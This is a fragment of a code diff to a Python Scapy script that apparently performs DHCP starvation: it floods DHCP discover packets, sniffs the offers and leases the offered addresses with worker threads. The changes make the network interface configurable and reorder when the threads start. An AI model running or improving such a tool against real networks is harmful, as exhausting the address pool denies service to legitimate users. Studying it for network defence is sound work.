@@ -105,7 +105,7 @@ def sendRequest(request_addr, src_mac):
 
 
 def sendPkt(pkt):
-    sendp(pkt, iface='eth0', verbose=0)
+    sendp(pkt, iface=iface, verbose=0)
 
 
 def getDhcpOption(pkt, op):
@@ -131,8 +131,8 @@ class DhcpSniffer(threading.Thread):
 
     def offerCallback(self, pkt):
         offered_ip = pkt[BOOTP].yiaddr
-        self.ip_queue.put( (time.time(), {'lease_ip': offered_ip}) )
         print('[*] dhcp offer detected for', offered_ip)
+        self.ip_queue.put( (time.time(), {'lease_ip': offered_ip}) )
 
     def ackCallback(self, pkt):
         acked_ip = pkt[BOOTP].yiaddr
@@ -199,14 +199,14 @@ def main():
 
     DhcpSniffer(iface, ip_queue, stop_event).start()
 
+    for i in range(num_of_req_threads):
+        DhcpRequestWorker(ip_queue, stop_event).start()
+
     DhcpDiscoverFlood(target, stop_event, ip_leasing_count).start()
 
     if not persist:
         time.sleep(10)
         stop_event.set()
-
-    for i in range(num_of_req_threads):
-        DhcpRequestWorker(ip_queue, stop_event).start()
 
     main_thread = threading.currentThread()
     for t in threading.enumerate():
